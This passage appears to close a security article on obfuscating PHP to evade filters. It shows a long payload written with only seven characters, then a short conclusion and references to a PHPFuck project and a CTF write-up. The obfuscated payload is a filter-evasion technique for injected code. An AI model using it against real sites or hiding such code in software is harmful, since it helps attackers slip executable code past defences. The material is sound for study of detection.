![])]).((((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).(([].![])[![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).([]))(!![])[([].![])[![]]]);
```

Only 7 characters (:

## Conclusion

These techniques are not all completely new. They can be combined to evade filters depending on the needs, but the more complex they are, the easier it is to spot them during a manual analysis. Possibilities are endless, and since PHP is a malleable language, we only scratched the surface.

## References

* [b-viguier.github.io/PhpFk/](https://b-viguier.github.io/PhpFk/)
* [mystiz.hk/posts/2021/2021-08-10-uiuctf-phpfuck/](https://mystiz.hk/posts/2021/2021-08-10-uiuctf-phpfuck/)